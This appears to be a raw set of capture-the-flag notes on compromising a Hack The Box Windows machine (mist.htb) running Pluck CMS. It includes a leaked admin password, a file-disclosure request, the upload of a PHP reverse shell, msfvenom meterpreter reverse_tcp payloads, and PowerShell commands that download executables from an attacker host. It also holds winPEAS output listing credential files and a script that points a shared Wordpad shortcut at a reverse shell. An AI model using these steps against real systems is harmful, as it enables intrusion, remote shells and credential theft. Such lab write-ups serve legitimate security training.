## WINDOWS - INSANE

## TARGET IP : 10.10.11.17

## RECON 

- [+] : port 80 open ONLY : cms running pluck 4.7.18 -> RCE but need to be authenticated

## FOOTHOLD 

- [+] : Admin password : lexypoo97

- [+] : GET /data/modules/albums/albums_getimage.php?image=admin_backup.php 

- [+] : Now Let's go back to the rce and upload revshell
```bash
Did it manually : go to options -> manage modules -> install a module 
where the http://10.10.11.17/admin.php?action=installmodule resides
since the payload couldnt access it for some reason 
upload zip file containing revshell in php make sure to try someones in revshells.com 
go to /data/modules/ to trigerr revshell
 
```
## ENUM  

- [+] : Get system information

```bash
C:\xampp\htdocs\data\modules\REV\mirabbas>systeminfo | findstr /b /C:"OS Name" /C"OS Version"

FINDSTR: /C ignored
FINDSTR: /  ignored
:0:
2:2:Host Name:                 MS01
3:35:OS Name:                   Microsoft Windows Server 2022 Standard
4:102:OS Version:                10.0.20348 N/A Build 20348
5:157:OS Manufacturer:           Microsoft Corporation
6:207:OS Configuration:          Member Server
7:249:OS Build Type:             Multiprocessor Free
8:297:Registered Owner:          Windows User
9:338:Registered Organization:   
10:367:Product ID:                00454-20165-01481-AA755
11:419:Original Install Date:     2/20/2024, 5:43:55 AM
12:469:System Boot Time:          3/30/2024, 9:58:08 PM
13:519:System Manufacturer:       Microsoft Corporation
14:569:System Model:              Virtual Machine
15:613:System Type:               x64-based PC
16:654:Processor(s):              1 Processor(s) Installed.
17:708:                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
18:801:BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.1, 12/3/2020
19:888:Windows Directory:         C:\Windows
20:927:System Directory:          C:\Windows\system32
21:975:Boot Device:               \Device\HarddiskVolume1
22:1027:System Locale:             en-us;English (United States)
23:1085:Input Locale:              it;Italian (Italy)
24:1132:Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
25:1199:Total Physical Memory:     1,023 MB
26:1236:Available Physical Memory: 310 MB
27:1271:Virtual Memory: Max Size:  2,687 MB
28:1308:Virtual Memory: Available: 1,667 MB
29:1345:Virtual Memory: In Use:    1,020 MB
30:1382:Page File Location(s):     C:\pagefile.sys
31:1426:Domain:                    mist.htb
32:1463:Logon Server:              N/A
33:1495:Hotfix(s):                 3 Hotfix(s) Installed.
34:1546:                           [01]: KB5034613
35:1590:                           [02]: KB5035857
36:1634:                           [03]: KB5035970
37:1678:Network Card(s):           1 NIC(s) Installed.
38:1726:                           [01]: Microsoft Hyper-V Network Adapter
39:1794:                                 Connection Name: Ethernet
40:1854:                                 DHCP Enabled:    No
41:1908:                                 IP address(es)
42:1957:                                 [01]: 192.168.100.101
43:2013:Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.



```


------ bad revshell lets do a meterpreter

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4446 -f exe -o reverseNW1.exe

msfconsole

set payload windows/x64/meterpreter/reverse_tcp
set lhost 
set lport
exploit

powershell.exe Invoke-WebRequest -Uri http://10.10.14.4:7000/reverse.exe -UseBasicParsing -o reverse123.exe

powershell.exe Invoke-WebRequest -Uri http://10.10.14.4:7000/reverseNW1.exe -UseBasicParsing -o reverseNW1.exe

powershell.exe Invoke-WebRequest -Uri http://10.10.14.4:7000/SharpHound.exe -UseBasicParsing -o SharpHound.exe

powershell.exe Invoke-WebRequest -Uri http://10.10.14.4:7000/winPEAS.exe -UseBasicParsing -o winpisse.exe
[+] Checking for Credential Files ()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi

    CredFile                      :  C:\Users\svc_web\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description                   :  Local Credential Data
    MasterKey                     :  629263bd-f503-4793-bab8-92b46354e0c3
    Accessed                      :  2/25/2024 5:42:18 AM
    Modified                      :  2/25/2024 5:42:18 AM
    Size                          :  11120

------------- dns

[+] DNS cached --limit 70-- (T1016)
    Entry                                 Name                                  Data
    dc01.mist.htb                         DC01.mist.htb                         192.168.100.100
    dc01.mist.htb                         DC01.mist.htb                         10.10.11.17
    dc01.mist.htb                         DC01.mist.htb                         192.168.100.100
    dc01.mist.htb                         DC01.mist.htb                         10.10.11.17
    
    ------------
    

[+] Ever logged users (T1087&T1033)
    MS01\Administrator
    MS01\svc_web
    MIST\Administrator
    MIST\Brandon.Keywarp
    MIST\Sharon.Mullard
    
    -------------------------
    
    HACKTRICKS

    C:\Users\svc_web : MS01\svc_web [FullControl]
    
[+] Password Policies (T1201)
   [?] This is insteresting for brute-force 

    Domain                        :  Builtin
    SID                           :  S-1-5-32
    MaxPasswordAge                :  42.22:47:31.7437440
    MinPasswordAge                :  00:00:00
    MinPasswordLength             :  0
    PasswordHistoryLength         :  0
    PasswordProperties            :  0
   =================================================================================================
    Domain                        :  MS01
    SID                           :  S-1-5-21-1075431363-3458046882-2723919965
    MaxPasswordAge                :  42.00:00:00
    MinPasswordAge                :  1.00:00:00
    MinPasswordLength             :  7
    PasswordHistoryLength         :  24
    PasswordProperties            :  DOMAIN_PASSWORD_COMPLEX
   =================================================================================================

C:\Windows\WinSxS\amd64_ipamprov-dcnps_31bf3856ad364e35_10.0.20348.1_none_29a6abe85afb6ce3\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_10.0.20348.1_none_fd993ef2bc02316c\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_10.0.20348.1_none_1afb49595ffda70a\ScheduledTasks.xml


msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4450 -f exe -o reverseNW1.exe
----------------------------------------
powershell.exe Invoke-WebRequest -Uri http://10.10.14.4:7000/reverseNW.exe -UseBasicParsing -o reverseNW.exe

powershell 

$shortcutPath = "C:\Common Applications\Wordpad.lnk"
$revPath = "C:\xampp\htdocs\data\modules\REV\mirabbas\reverseNW.exe"
$shell = New-Object -comObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $revPath 
$shortcut.Save()

.\Wordpad.lnk



